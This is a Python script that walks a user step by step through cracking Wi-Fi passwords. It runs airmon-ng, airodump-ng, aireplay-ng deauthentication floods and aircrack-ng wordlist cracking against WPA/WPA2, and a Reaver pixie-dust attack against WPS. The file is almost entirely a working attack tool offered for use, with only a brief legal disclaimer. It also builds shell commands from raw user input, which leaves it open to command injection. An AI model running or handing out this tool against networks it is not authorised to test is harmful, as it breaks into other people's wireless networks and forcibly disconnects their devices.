#!/usr/bin/python3
def clearScreen():
    import os
    if input("\033[1;34;48m[i] \033[1;37;48mPress 'y' to perform cleanup! >>").lower().startswith("y"):
        print("\n\033[1;34;48m[info] \033[0;37;48mWait a few seconds, cleaning up...")
        os.system("airmon-ng stop wlan1mon >> log.txt;echo 'almost done';airmon-ng stop wlan0mon >> log.txt")
        os.system("clear")
        if input("\n\033[1;37;48m[-] \033[0;38;48mPress [y] to exit or any other key to return to start>>").lower().startswith("y"):
            os.system("rm log.txt")
            os._exit(1)
        else:
            os.system("clear")
            title()
            os.system("rm log.txt")
    else:
        clearScreen()
def reaver():
    import os, time
    try:
        os.system('clear')
        print("\033[1;32;48m[+] \033[0;36;48mThanks for chossing reaver")
        print("\033[1;37;48m[-] \033[0;33;48mPlease note that Reaver-pixie dust method only works on very few WPS access points worldwide. This number is dwindlling and success chances are very low. That doesn't mean its all 'Doom and Gloom' ")
        print("\033[1;37;48m[+] \033[0;32;48mDespite the odds, when it works, it feels magical. Like the powers above sprinkled some pixie dust on your computer.")
        ack = input("\033[1;33;48m[?] \033[0;35;48mType 'y' to continue>>")
        if ack.lower().startswith('y'):
            print("\033[1;33;48m[-] \033[0;37;48mChecking for dependancies")
            if os.system("dpkg -l xterm apt | awk -F ' ' {'print $2'} | grep -i 'xterm' > log.txt")==0:
                if os.system("dpkg -l xterm apt | awk -F ' ' {'print $2'} | grep -i 'apt' >> log.txt")==0:
                        if os.system("dpkg -l reaver | awk -F ' ' {'print $2'} | grep -i 'reaver' > log.txt")==0:
                            if os.system("dpkg -l aircrack-ng | awk -F ' ' {'print $2'} | grep -i 'aircrack-ng' > log.txt")==0:
                                print("\033[1;33;48m[-] \033[0;35;48mAll dependancies are met ma dude. Make sure you have correct drivers! \033[0;37;48m")
                                time.sleep(2)
                                os.system('clear')
                                print("""\033[0;36;48m
                                
██████╗ ██╗██╗  ██╗██╗███████╗    ██████╗ ██╗   ██╗███████╗████████╗
██╔══██╗██║╚██╗██╔╝██║██╔════╝    ██╔══██╗██║   ██║██╔════╝╚══██╔══╝
██████╔╝██║ ╚███╔╝ ██║█████╗      ██║  ██║██║   ██║███████╗   ██║   
██╔═══╝ ██║ ██╔██╗ ██║██╔══╝      ██║  ██║██║   ██║╚════██║   ██║   
██║     ██║██╔╝ ██╗██║███████╗    ██████╔╝╚██████╔╝███████║   ██║   
╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚══════╝   ╚═╝   
                                                                    

\033[1;33;48m[info] \033[0;32;48mDeveloped by Sh3llCod3, Using the reaver tool. 2017-2020. Use with legal caution, disclaimer applies.Thanks for using this program\n""")
                                print("Ok lets put a Card in monitor mode\n")
                                print("\033[1;32;48m[+] \033[0;37;48myour cards are:\n ")
                                os.system("airmon-ng | grep -i 'wlan*' | cut -d' ' -f 1 | awk -F ' ' {'print $2'}")
                                print("\n")
                                index = input("\033[1;33;48m[?] \033[0;37;48mWhat card shall I put in monitor mode? wlan0 [enter 0] wlan1 [enter 1] etc >>")
                                query = ("wlan"+"%s" %(index))
                                query = str(query)
                                os.system("airmon-ng start %s >> log.txt" %(query))
                                os.system('clear')
                                print("\033[1;34;48m[info] \033[0;32;48mOk, seems like %s is started, time to get crackin'" %(query))
                                print("\033[1;34;48m[info] \033[0;37;48mNow we'll run wash to find all the wps networks around")
                                print("\033[1;34;48m[info] \033[0;33;48mPlease press CTRL+C once you see your target network")
                                z = input("\033[0;34;48m\nGot all that? Press enter >>")
                                z = str(z)
                                os.system("wash -i %smon" %(query))
                                b = input("\n\033[1;33;48m[?] \033[0;34;48mJust copy+paste the bssid of the target network [no spaces]>>")
                                b = str(b)
                                c = input("\033[1;34;48m[?] \033[1;35;48mFinally tell me the channel of the target ap [look for Ch] >>")
                                c = str(c)
                                os.system("clear")
                                print("\033[1;34;48m[info] \033[1;37;48mOnce you hit enter i'll attempt to pwn the wps using Reaver + Pixie dust.")
                                print("\033[1;34;48m[info] \033[1;33;48mPlease note that this can backfire and lock the AP if left for too long")
                                print("\033[1;34;48m[info] \033[1;35;48mIt should work in 30secs~45secs. If you see it running for more, then cancel it with CTRL+C.Don't risk it.Try again.")
                                d = input("\033[1;34;48m\nPlease press enter to continue or CTRL+C to exit now >>")
                                os.system("reaver -i %smon -b %s -K 1 -vvv -c %s" %(query,b,c))
                                print("\033[1;34;48m\n[info] \033[1;35;48mBy now it has either worked or not. If it hasn't, well then i'm sorry. Please use the aircrack-ng approach instead or if it has then CONGRATS ON FINDING THE PSK!")        
                                clearScreen()
                            else:
                                print("\033[1;33;48m[-] \033[0;37;48mDependancies not found, updating system and installing. Please hold!")
                                os.system("sudo apt-get update > log.txt && sudo apt install apt -y > log.txt && sudo apt install xterm -y > log.txt")
                                os.system("xterm $HOLD -title 'Installing any dependancies [aircrack-ng]'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e sudo apt install gawk reaver aircrack-ng wireless-tools ethtool -y")
                                print("\033[1;33;48m[-] \033[0;35;48mAll dependancies are met ma dude. Make sure you have correct drivers! \033[0;37;48m")
                                time.sleep(2)    
        else:
            os.system('clear')
            reaver()
    except(KeyboardInterrupt,EOFError,TypeError,TabError,NameError):
            print("\n\033[1;34;48m[info] \033[0;37;48mWait a few seconds, cleaning up...")
            os.system("airmon-ng stop wlan1mon >> log.txt;echo 'almost done';airmon-ng stop wlan0mon >> log.txt")
            os.system("clear")
            if input("\n\033[1;37;48m[-] \033[0;38;48mPress [y] to exit or any other key to return to start>>").lower().startswith("y"):
                os.system("rm log.txt")
                os._exit(1)
            else:
                os.system("clear")
                title()
                os.system("rm log.txt")
def aircrackng():
    import os,time
    print("\033[1;33;48m[-] \033[0;37;48mChecking for dependancies")
    if os.system("dpkg -l xterm apt | awk -F ' ' {'print $2'} | grep -i 'xterm' > log.txt")==0:
        if os.system("dpkg -l xterm apt | awk -F ' ' {'print $2'} | grep -i 'apt' >> log.txt")==0:
                if os.system("dpkg -l aircrack-ng | awk -F ' ' {'print $2'} | grep -i 'aircrack-ng' > log.txt")==0:
                    print("\033[1;33;48m[-] \033[0;35;48mAll dependancies are met ma dude. Make sure you have correct drivers! \033[0;37;48m")
                    time.sleep(2)		
    else:
        print("\033[1;33;48m[-] \033[0;37;48mDependancies not found, updating system and installing. Please hold!")
        os.system("sudo apt-get update > log.txt && sudo apt install apt -y > log.txt && sudo apt install xterm -y > log.txt")
        os.system("xterm $HOLD -title 'Installing any dependancies [aircrack-ng]'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e sudo apt install aircrack-ng -y")
        print("\033[1;33;48m[-] \033[0;35;48mAll dependancies are met ma dude. Make sure you have correct drivers! \033[0;37;48m")
        time.sleep(2)
    time.sleep(0.5)
    os.system("clear")
    while True:
        try:
            def mainScreen():
                print ("""
    \n\033[1;36;48m
              _______ _________ _                   _______  _______  ________          _ 
    |\     /|(  ___  )\__   __/( \        |\     /|(  ____ \(  ____ \/__   __/|\     /|( )
    | )   ( || (   ) |   ) (   | (        | )   ( || (    \/| (    \/   ) (   ( \   / )| |
    | (___) || (___) |   | |   | |        | | _ | || (__    | (_____    | |    \ (_) / | |
    |  ___  ||  ___  |   | |   | |        | |( )| ||  __)   (_____  )   | |     \   /  | |
    | (   ) || (   ) |   | |   | |        | || || || (            ) |   | |      ) (   (_)
    | )   ( || )   ( |___) (___| (____/\  | () () || (____/\/\____) |   | |      | |    _ 
    |/     \||/     \|\_______/(_______/  (_______)(_______/\_______)   )_(      \_/   (_)
    \n\033[0;37;48m                                                                                      
    """)
                os.system("echo 'Starting...'")
                os.system("airmon-ng stop wlan1mon > log.txt && airmon-ng stop wlan0mon >> log.txt")
                print("\nHi, welcome to aircrack-ng made easy")
                print("Please read everything that appears at the bottom")
                print("Thanks for using this program")
                print("\n\033[1;32;48m[+] \033[0;37;48myour cards are: \n")
                os.system("airmon-ng | grep -i 'wlan*' | cut -d' ' -f 1 | awk -F ' ' {'print $2'}")
                print("\n")
                index = input("\033[1;33;48m[?] \033[0;37;48mWhat card shall I put in monitor mode? wlan0 [enter 0] wlan1 [enter 1] etc >>")
                query = ("wlan"+"%s" %(index))
                query = str(query)
                os.system("airmon-ng start %s >> log.txt" %(query))
                print("\033[1;34;48m[info] \033[0;37;48m1) Ok, seems like %s is started, time to get crackin'" %(query))
                print("\033[1;34;48m[info] \033[0;37;48m2) now, we'll run Airodump-ng to capture the handshake")
                input("\033[1;34;48m[info] \033[0;37;48m3) once you start airodump, you need to press ctrl+c when you see your target network. \n\n\033[1;33;48m[?] press enter to continue >>")
                os.system("airodump-ng -a %smon" %(query)) 
                print("Ok, all I need is a few things from you")
                b = input("\033[1;33;48m[?] \033[0;37;48mFirst, we'll create a new file to store the key in. What shall I call it? [no spaces]>>")
                b = str(b)
                c = input("\033[1;33;48m[?] \033[0;37;48mNow, tell me the (copy/paste) channel {look at CH column} of the network [no spaces]>>")
                c = str(c)
                d = input("\033[1;33;48m[?] \033[0;37;48mFinally tell me the (copy/paste) bssid of the network [no spaces]>>")
                d = str(d)
                if b and c and d != "":
                    print("\033[1;34;48m[info] \033[0;37;48mNow, the idea is when someone connects/reconnects, we grab the password")
                    print("\033[1;34;48m[info] \033[0;37;48mThat's why we need to disconnect someone. You dont have to, you can wait for someone to connect or connect manually")
                    print("\033[1;34;48m[info] \033[0;37;48mYou can leave it blank to not disconnect anyone")
                    e = input("\n\033[1;33;48m[?] \033[0;37;48mHow many de-auths/disconnects shall I send? Don't use '0'! >>")
                    e = str(e)
                    print("\033[1;34;48m[info] \033[0;37;48mLook at the second column where it says bssid/station.")
                    print("\033[1;34;48m[info] \033[0;37;48mIn simple terms the bssid is the wifi access point and the station is a devices connected to that network.")
                    print("\033[1;34;48m[info] \033[0;37;48mYou can copy/paste a station address to de-auth/disconnect a specific device rather than all devices on the network")
                    print("\033[1;34;48m[info] \033[0;37;48mThis is a more stealthy as only one device is being disconnected.")
                    print("\033[1;34;48m[info] \033[0;37;48mplease ensure that the station (address) you copy/paste is connected to the the bssid you copied earlier [Look in the bssid column]")
                    print("It is optional but you can also leave this blank if you still don't get it")
                    g = input("\n\033[1;33;48m[?] \033[0;37;48mPlease copy/paste station (address) here or leave blank>>")
                    g = str(g)
                    if e != "" and g != "":
                        input("\n\033[1;33;48m[?] \033[0;37;48mPRESS ENTER TO RUN. ONCE YOU SEE WPA HANDSHAKE:%s AT THE TOP RIGHT PRESS CTRL+C!! THIS IS VITAL!! [press enter]>>" %(d))
                        os.system("iwconfig %smon channel %s" %(query,c))
                        os.system("xterm $HOLD -title 'DEAUTHING'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e aireplay-ng -0 %s -a %s -c %s %smon;airodump-ng -w %s -c %s --bssid %s %smon" %(e,d,g,query,b,c,d,query))
                        print("\033[1;34;48m[info] \033[0;37;48mIf you saw [WPA HANDSHAKE: %s] at the top right,then its time to crack the handshake." %(d))
                        print("\033[1;34;48m[info] \033[0;37;48mFirst make sure you have a wordlist which has the password in it ")
                        print("\033[1;34;48m[info] \033[0;37;48mOnce you download or locate one press enter")
                        print("\033[1;34;48m[info] \033[0;37;48mHopefully the password will be in there or put it in there")
                        f = input("\n\n\033[1;32;48m[+] \033[0;37;48mDrag the wordlist on the terminal, literally!! use the file manager! >>")
                        f = str(f)
                        print("\033[1;34;48m[info] \033[0;37;48mOk, ready? press enter to start cracking")
                        print("\033[1;34;48m[info] \033[0;37;48mIf nothing is found after a while then ctrl+c and try again with a different wordlist")
                        input("\033[1;33;48m[press enter]>>")
                        os.system("aircrack-ng %s-01.cap -w %s" %(b,f))
                        input("\n\n\033[1;32;48m[+] \033[0;37;48mLOOK AT KEY FOUND, THAT'S THE PASSWORD. WRITE IT DOWN AND PRESS ENTER TO CLEANUP >>")
                        print("\n\033[1;34;48m[info] \033[0;37;48mRunning cleanup..")
                        os.system("airmon-ng stop %smon > log.txt" %(query))
                        os.system("rm log.txt")
                        os.system("clear")
                        print("\033[1;32;48m[+] \033[0;37;48mCONGRATS IF YOU FIND THE PSK!")
                        print("\033[1;32;48m[+] \033[0;37;48mGOODBYE!")
                        os._exit(1)
                    elif e != "" and g == "":
                        input("\n\033[1;33;48m[?] \033[0;37;48mPRESS ENTER TO RUN. ONCE YOU SEE WPA HANDSHAKE:%s AT THE TOP RIGHT PRESS CTRL+C!! THIS IS VITAL!! \n[press enter]>>" %(d))
                        os.system("iwconfig %smon channel %s" %(query,c))
                        os.system("xterm $HOLD -title 'DEAUTHING'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e aireplay-ng -0 %s -a %s %smon;airodump-ng -w %s -c %s --bssid %s %smon" %(e,d,query,b,c,d,query))
                        print("\n\033[1;34;48m[info] \033[0;35;48mIf you saw [WPA HANDSHAKE: %s] at the top right,then its time to crack the handshake." %(d))
                        print("\033[1;34;48m[info] \033[0;37;48mFirst make sure you have a wordlist which has the password in it ")
                        print("\033[1;34;48m[info] \033[0;37;48mOnce you download or locate one press enter")
                        print("\033[1;34;48m[info] \033[0;37;48mHopefully the password will be in there or put it in there")
                        f = input("\n\033[1;32;48m[+] \033[0;37;48mDrag the wordlist on the terminal, literally!! use the file manager! >>")
                        f = str(f)
                        print("\033[1;34;48m[info] \033[0;37;48mOk, ready? press enter to start cracking")
                        print("\033[1;34;48m[info] \033[0;37;48mIf nothing is found then ctrl+c and try again")
                        input("\033[1;33;48m[press enter]>>")
                        os.system("aircrack-ng %s-01.cap -w %s" %(b,f))
                        input("\n\n\033[1;32;48m[+] \033[0;37;48mLOOK AT KEY FOUND, THAT'S THE PASSWORD. WRITE IT DOWN AND PRESS ENTER TO CLEANUP >>")
                        print("\n\033[1;34;48m[info] \033[0;37;48mRunning cleanup..")
                        os.system("airmon-ng stop %smon > log.txt" %(query))
                        os.system("rm log.txt")
                        os.system("clear")
                        print("\033[1;32;48m[+] \033[0;37;48mCONGRATS IF YOU FIND THE PSK!")
                        print("\033[1;32;48m[+] \033[0;37;48mGOODBYE!")
                        os._exit(1)					
                    else:
                        print("\033[1;34;48m[info] \033[0;37;48mOk, you have chosen not to disconnect anyone.")
                        print("\033[1;34;48m[info] \033[0;37;48mYou need to wait for someone to connect or connect manually yourself")
                        input("\033[1;34;48m[info] \033[0;37;48mReady? Hit enter to run. When you see WPA HANDSHAKE:%s at the top right press ctrl+c>>" %(d))
                        os.system("\niwconfig %smon channel %s" %(query,c))
                        os.system("\nairodump-ng -w %s -c %s --bssid %s %smon" %(b,c,d,query))
                        print("\n\033[1;34;48m[info] \033[0;37;48mIf you saw [WPA HANDSHAKE: %s] at the top right,then its time to crack the handshake." %(d))
                        print("\033[1;34;48m[info] \033[0;37;48mFirst make sure you have a wordlist which has the password in it ")
                        print("\033[1;34;48m[info] \033[0;37;48mOnce you download or locate one press enter")
                        print("\033[1;34;48m[info] \033[0;37;48mHopefully the password will be in there or put it in there")
                        f = input("\n\033[1;32;48m[+] \033[0;37;48mDrag the wordlist on the terminal, literally!! use the file manager! >>")
                        f = str(f)
                        print("\033[1;34;48m[info] \033[0;37;48mOk, ready? press enter to start cracking")
                        print("\033[1;34;48m[info] \033[0;37;48mIf nothing is found then ctrl+c and try again")
                        input("\033[1;33;48m[press enter]>>")
                        os.system("aircrack-ng %s-01.cap -w %s" %(b,f))
                        input("\n\n\033[1;32;48m[+] \033[0;37;48mLOOK AT KEY FOUND, THAT'S THE PASSWORD. WRITE IT DOWN AND PRESS ENTER TO CLEANUP >>")
                        print("\n\033[1;34;48m[info] \033[0;37;48mRunning cleanup..")
                        os.system("airmon-ng stop %smon > log.txt" %(query))
                        os.system("rm log.txt")
                        os.system("clear")
                        print("\033[1;32;48m[+] \033[0;37;48mCONGRATS IF YOU FIND THE PSK!")
                        print("\033[1;32;48m[+] \033[0;37;48mGOODBYE!")
                        os._exit(1)

                else:
                    input("\033[1;37;40m[-] \033[0;37;48mYou missed something, try again, \n\033[1;33;48m[press enter]>>")
                    mainScreen()
            mainScreen()
        except(KeyboardInterrupt,EOFError,TypeError,TabError,NameError):
            print("\n\033[1;34;48m[info] \033[0;37;48mWait a few seconds, cleaning up...")
            os.system("airmon-ng stop wlan1mon >> log.txt;echo 'almost done';airmon-ng stop wlan0mon >> log.txt")
            os.system("clear")
            if input("\n\033[1;37;48m[-] \033[0;38;48mPress [y] to exit or any other key to return to start>>").lower().startswith("y"):
                os.system("rm log.txt")
                os._exit(1)
            else:
                os.system("clear")
                title()
                os.system("rm log.txt")
def title():
    try:
        import os
        os.system('clear')
        print("\033[1;33;48m[?] \033[0;37;48mWhat tool would you like to use?")
        print("\033[1;35;48mType [1] - Aircrack-ng to crack WPA/WPA2")
        print("\033[1;34;48mType [2] - Reaver with pixie dust to crack WPS (rare vulnerability)")
        selection = input("\033[0;35;48mPress 1 or 2 >>")
        if selection == "1":
            aircrackng()
        elif selection == "2":
            reaver()
        else: 
            os.system('clear')
            title()
    except(KeyboardInterrupt,EOFError,TypeError,TabError,NameError):
        print("\n")
        os.system("rm log.txt")
        os._exit(1)
title()
